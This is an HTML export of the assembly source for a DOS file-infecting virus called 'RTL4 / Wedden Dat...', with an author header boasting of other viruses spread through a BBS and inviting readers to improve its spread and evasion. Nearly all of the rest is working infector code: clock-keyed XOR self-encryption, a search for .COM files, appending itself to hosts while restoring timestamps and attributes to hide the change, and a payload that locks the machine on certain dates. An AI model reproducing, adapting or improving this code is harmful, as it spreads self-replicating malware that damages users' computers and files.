<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; RTL4 / WEDDEN DAT... VIRUS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "If a weaking linkage found, eliminate...</span><span class="sc0">
</span><span class="sc1">;       Hear the cities fearfull roar!"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now in front of you lies another source of a virus. It is not a very good</span><span class="sc0">
</span><span class="sc1">; one, but, as you might say, a virus is a virus. After my wake at the PC, I</span><span class="sc0">
</span><span class="sc1">; created several viruses, like:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Deicide / Glenn</span><span class="sc0">
</span><span class="sc1">; Morgoth</span><span class="sc0">
</span><span class="sc1">; Breeze</span><span class="sc0">
</span><span class="sc1">; Brother</span><span class="sc0">
</span><span class="sc1">; Commentator I</span><span class="sc0">
</span><span class="sc1">; Commentator II</span><span class="sc0">
</span><span class="sc1">; Spawnie</span><span class="sc0">
</span><span class="sc1">; Xmas</span><span class="sc0">
</span><span class="sc1">; 1St_Star / 222</span><span class="sc0">
</span><span class="sc1">; T-1000</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Well, I bet you think this is a whole lot, but some are minor variants, for</span><span class="sc0">
</span><span class="sc1">; which I don't have the guts to publish the source code. I have to admid,</span><span class="sc0">
</span><span class="sc1">; Deicide and Morgoth have spread very well. I uploaded them to a BBS and it</span><span class="sc0">
</span><span class="sc1">; was downloaded several times, and it is not detected by antivirus program yet.</span><span class="sc0">
</span><span class="sc1">; Deicide is now detectable, but that was my first attempt to make a virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus is a Non-Resident Direct Action .COM Infector.</span><span class="sc0">
</span><span class="sc1">; It only infects files in the current directory.</span><span class="sc0">
</span><span class="sc1">; You can recognize a infected file simply, the 4th byte is a '*' (just like</span><span class="sc0">
</span><span class="sc1">; the 1St_Star virus). It is inactive from January till May and starts</span><span class="sc0">
</span><span class="sc1">; replicating from May. After July, every Wednessday after the 21st the</span><span class="sc0">
</span><span class="sc1">; program will hang the system, showing the address of RTL4 Joop v/d Ende</span><span class="sc0">
</span><span class="sc1">; Productions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Disclaimer : This program is like all other virus sources only for</span><span class="sc0">
</span><span class="sc1">; educational purposes and should not be given to irresponsible hands</span><span class="sc0">
</span><span class="sc1">; (John McAfee and people like him).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For the criminal reader : Don't just change the text of this virus and</span><span class="sc0">
</span><span class="sc1">; say you made a virus. Instead use some ideas from this virus and create your</span><span class="sc0">
</span><span class="sc1">; own virus if you want to be nasty. Additions to this virus that makes it</span><span class="sc0">
</span><span class="sc1">; spreading faster and makes it harder to detect are welcome, as long as I get</span><span class="sc0">
</span><span class="sc1">; the new source code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I want to thank several virus writers for their support with letting McAfee</span><span class="sc0">
</span><span class="sc1">; and Ass. earn his money with making so many updates of SCAN...</span><span class="sc0">
</span><span class="sc1">; Here they are : Bit Addict, XSTC, Dark Helmet, Dark Avenger, Nuke!, Cracker</span><span class="sc0">
</span><span class="sc1">; Jack and many more creators.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Note to XSTC : Thank you for disassembling the Deicide virus, for I have lost</span><span class="sc0">
</span><span class="sc1">; the source code. Next time write a message, because I might have the source</span><span class="sc0">
</span><span class="sc1">; code of the virus ready, but not uploaded. It saves you time, so you may</span><span class="sc0">
</span><span class="sc1">; disassemble another virus (ofcourse only for educational purposes ;-) )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now have fun with this virus, written in A86 assembler version 3.22</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               Glenn Benton</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "Is it truly a disembodied head lurking in the dark of the tombs of fate?"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                          </span><span class="sc1">; The outcome will be .BIN</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">MainVir</span><span class="sc0">                     </span><span class="sc1">; Jump to main virus</span><span class="sc0">
                </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'*'</span><span class="sc0">                          </span><span class="sc1">; signature</span><span class="sc0">

</span><span class="sc5">MainVir</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">On1</span><span class="sc0">                        </span><span class="sc1">; Get virus offset</span><span class="sc0">
</span><span class="sc5">On1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                          </span><span class="sc1">; BP is the index register</span><span class="sc0">
                </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">MainVir</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Calculate virus offset</span><span class="sc0">
                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">                         </span><span class="sc1">; And store AX (error reg.)</span><span class="sc0">

                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Crypt</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Decryptor for the</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">                       </span><span class="sc1">; virus code. It's long</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">CryptLen</span><span class="sc0">                 </span><span class="sc1">; for a decoder, but it</span><span class="sc0">
</span><span class="sc5">Decrypt</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Lodsb</span><span class="sc0">                           </span><span class="sc1">; reduces the recognizable</span><span class="sc0">
                </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; part enough.</span><span class="sc0">
                </span><span class="sc6">Stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">Decrypt</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">DecrLen</span><span class="sc0">         </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MainVir</span><span class="sc0">                   </span><span class="sc1">; Decryptor length</span><span class="sc0">

</span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OrgPrg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Store the 4 first bytes</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OrgPrg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; of the host</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Start</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]+</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                      </span><span class="sc1">; Get date</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; If it is a wednessday</span><span class="sc0">
                </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">; after July and after</span><span class="sc0">
                </span><span class="sc6">Jb</span><span class="sc0">  </span><span class="sc5">NoMsg</span><span class="sc0">                       </span><span class="sc1">; the 21st, it will</span><span class="sc0">
                </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc0">                       </span><span class="sc1">; will continue, else</span><span class="sc0">
                </span><span class="sc6">Jb</span><span class="sc0">  </span><span class="sc5">NoMsg</span><span class="sc0">                       </span><span class="sc1">; it goes to NoMsg</span><span class="sc0">
                </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">NoMsg</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                        </span><span class="sc1">; Display the message</span><span class="sc0">
                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Msg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Lockout</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Cli</span><span class="sc0">                             </span><span class="sc1">; And lock the computer</span><span class="sc0">
                </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Lockout</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NoMsg</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Dh</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                        </span><span class="sc1">; Is it after April?</span><span class="sc0">
                </span><span class="sc6">Jae</span><span class="sc0"> </span><span class="sc5">DoVirus</span><span class="sc0">                     </span><span class="sc1">; Yes - Replicate</span><span class="sc0">
                </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">                       </span><span class="sc1">; No - Terminate to host</span><span class="sc0">

</span><span class="sc5">DoVirus</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                      </span><span class="sc1">; Move DTA to a safe place</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fc00h</span><span class="sc0">                   </span><span class="sc1">; $FE00</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Search</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">FileSpec</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Search for a .COM file in</span><span class="sc0">
                </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                       </span><span class="sc1">; the current directory</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Jnc</span><span class="sc0"> </span><span class="sc5">Found</span><span class="sc0">                       </span><span class="sc1">; If not exist, goto Ready</span><span class="sc0">
                </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">                       </span><span class="sc1">; else goto Found</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                    </span><span class="sc1">; Get file attributes</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fc1eh</span><span class="sc0">                   </span><span class="sc1">; and store them on the stack</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; Wipe the attributes, so it</span><span class="sc0">
                </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                       </span><span class="sc1">; is accessable for us</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; Open the file with</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; read/write priority</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                    </span><span class="sc1">; Get de file date/time stamp</span><span class="sc0">
                </span><span class="sc6">Xchg</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">                      </span><span class="sc1">; and store them on the stack</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read the first 4 bytes</span><span class="sc0">
                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">OrgPrg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; of the program</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc5">OrgPrg</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Is it a weird EXE?</span><span class="sc0">
                </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">                     </span><span class="sc1">; Yes goto ExeFile</span><span class="sc0">
                </span><span class="sc6">Je</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">                     </span><span class="sc1">; Is it a normal EXE?</span><span class="sc0">
                </span><span class="sc6">Je</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">                      </span><span class="sc1">; Yes, goto ExeFile</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc5">OrgPrg</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Is it already infected?</span><span class="sc0">
                </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">                      </span><span class="sc1">; No, goto Infect</span><span class="sc0">
                </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ExeFile</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">                      </span><span class="sc1">; Call File close</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; Jump to the search routine</span><span class="sc0">
                </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">                      </span><span class="sc1">; again for a .COM file</span><span class="sc0">

</span><span class="sc5">FSeek</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                       </span><span class="sc1">; Subroutine for jumping to</span><span class="sc0">
                </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">                       </span><span class="sc1">; the begin/end of file</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Ret</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                    </span><span class="sc1">; Jump to EOF</span><span class="sc0">
                </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FSeek</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; Calculate new virus offset</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">CallPtr</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                      </span><span class="sc1">; Get system time</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Decrypt</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc8">Dl</span><span class="sc0">         </span><span class="sc1">; Move the decryptor part</span><span class="sc0">
                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">MainVir</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; with the 100ds second put</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">                   </span><span class="sc1">; into the XOR command to</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">DecrLen</span><span class="sc0">                  </span><span class="sc1">; the end of the 64K segment</span><span class="sc0">
                </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">Movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Crypt</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Encrypt the virus with</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">CryptLen</span><span class="sc0">                 </span><span class="sc1">; the 100ds seconds.</span><span class="sc0">
</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Lodsb</span><span class="sc0">                           </span><span class="sc1">; Merge it behind the</span><span class="sc0">
                </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">                       </span><span class="sc1">; decryptor</span><span class="sc0">
                </span><span class="sc6">Stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">Encrypt</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Write the virus</span><span class="sc0">
                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">                   </span><span class="sc1">; at the end of the</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">                   </span><span class="sc1">; file</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; Move to start of</span><span class="sc0">
                </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FSeek</span><span class="sc0">                      </span><span class="sc1">; the file</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Write the jump to the virus</span><span class="sc0">
                </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">CallPtr</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; at the begin of the file</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">                      </span><span class="sc1">; Close the file</span><span class="sc0">

</span><span class="sc5">Ready</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                      </span><span class="sc1">; Restore the DTA to the</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                      </span><span class="sc1">; original offset</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">                          </span><span class="sc1">; Get (possible) error code</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                     </span><span class="sc1">; Strange jump (but nice) to</span><span class="sc0">
                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                         </span><span class="sc1">; the begin of the program</span><span class="sc0">
                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">                         </span><span class="sc1">; (which has been restored)</span><span class="sc0">
                </span><span class="sc6">Retf</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">                          </span><span class="sc1">; A pop which is stupid</span><span class="sc0">

                </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">                          </span><span class="sc1">; Restore files date/time</span><span class="sc0">
                </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                          </span><span class="sc1">; stamp</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; Close file</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; Restore attributes</span><span class="sc0">
                </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fc1eh</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">                         </span><span class="sc1">; A push which is stupid</span><span class="sc0">

